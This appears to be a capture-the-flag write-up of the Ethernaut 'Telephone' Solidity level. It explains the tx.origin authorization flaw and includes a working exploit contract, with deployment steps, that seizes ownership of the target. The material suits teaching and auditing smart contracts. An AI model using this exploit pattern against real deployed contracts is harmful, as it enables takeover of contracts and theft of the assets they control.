## contract code :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
**Vulnerability:** the contract uses tx.origin for authorization, which is vulnerable to phishing attacks. The tx.origin global variable refers to the original externally owned account (EOA) that initiated the transaction, while msg.sender refers to the immediate caller of the function (which could be another contract).

The core vulnerability lies within the changeOwner() function's authorization check:
```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}
```
An attacker can exploit this by creating a malicious contract that calls changeOwner(). When the victim calls the attacker's contract, tx.origin will be the victim's address and msg.sender will be the attacker's contract address, bypassing the check.
### Exploit Steps
1. Create an attacking contract that calls the changeOwner() function:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface ITelephone {
    function changeOwner(address _owner) external;
}
contract TelephoneExploit {
    
   
    address public targetAddress;
    

    
    constructor(address _targetAddress) {
        
        targetAddress = _targetAddress;
    }

    
    function attack() public {
      
        ITelephone(targetAddress).changeOwner(msg.sender);
    }
}
```
2. Deploy the attacking contract with the target contract address as a parameter.
3. Call the attack function
4. Verify that the owner has been changed to your address.
